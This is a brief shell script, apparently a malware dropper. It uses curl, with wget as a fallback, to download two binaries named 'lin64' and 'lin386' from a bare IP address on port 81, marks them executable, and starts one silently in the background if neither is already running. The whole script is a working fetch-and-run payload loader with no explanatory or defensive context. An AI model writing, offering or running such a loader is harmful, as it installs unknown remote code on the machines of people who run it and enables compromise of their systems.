curl http://185.173.36.219:81/download/lin64 -o lin64
curl http://185.173.36.219:81/download/lin386 -o lin386
if [ ! -f lin64 ]
    then
    wget http://185.173.36.219:81/download/lin64 -O lin64
fi
if [ ! -f lin386 ]
    then
    wget http://185.173.36.219:81/download/lin386 -O lin386
fi
chmod +x lin64
chmod +x lin386
var=$(pgrep lin386)
var1=$(pgrep lin64)
if [ -z "$var" ] && [ -z "$var1" ]
    then 
    ./lin64 &>/dev/null &
    var1=$(pgrep lin64)
    if [ -z "$var1" ]
    	then
    	./lin386 &>/dev/null &
    	fi
fi
